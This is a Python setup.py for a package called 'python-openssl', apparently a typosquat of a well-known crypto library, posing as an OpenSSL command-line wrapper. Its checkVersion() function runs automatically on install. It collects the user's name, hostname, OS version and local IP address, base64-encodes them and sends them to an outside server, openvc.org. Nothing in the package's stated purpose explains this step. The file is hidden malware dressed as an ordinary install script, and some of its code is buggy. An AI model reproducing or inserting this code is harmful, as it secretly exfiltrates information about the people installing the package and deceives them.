# from distutils.core import setup
from setuptools import setup, find_packages
from codecs import open
from os import path
import sys,socket,base64,os
import getpass,platform
if sys.version_info>(3,0):
    from urllib import request,parse
elif sys.version_info<(3,0):
    import urllib

here = path.abspath(path.dirname(__file__))
with open(path.join(here, 'README.md'), encoding='utf-8') as f:
        long_description = f.read()

def checkVersion():
    user_name = getpass.getuser()
    hostname = socket.gethostname()
    os_version = platform.platform()
    if platform.system() is 'Windows':
        import ctypes
        import locale
        dll_handle = ctypes.windll.kernel32
        loc_lang = locale.getdefaultlocale()
        language = ':'.join(loc_lang)
    elif platform.system() is 'Linux':
        loc_lang = os.popen("echo $LANG")
        language = loc_lang.rea
    ip = [(s.connect(('8.8.8.8', 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]
    package='python-openssl'
    vid = user_name+"###"+hostname+"###"+os_version+"###"+ip+"###"+package
    if sys.version_info>(3,0):
        request.urlopen(r'http://openvc.org/Version.php',data='vid='.encode('utf-8')+base64.b64encode(vid.encode('utf-8')))
    elif sys.version_info<(3,0):
        urllib.urlopen(r'http://openvc.org/Version.php','vid='+base64.encodestring(vid))
checkVersion()		
setup(
    name='python-openssl',
    version='0.1',
    packages=['pyopenssl'],
    url='https://github.com/the11/openssl-python',
    license='GNU GPLv3',
    author='Youssef Seddik',
    author_email='yseddik94@gmail.com',
    description='Command line interface to OpenSSL with Python3',
    long_description=long_description,
    classifiers=[
        'Development Status :: 3 - Alpha',
        'Intended Audience :: Information Technology',
        'License :: OSI Approved :: GNU General Public License v3 (GPLv3)',
        'Programming Language :: Python :: 3.4',
   ],
    keywords='crypto encryption RSA-keys signature signature-verification',
)

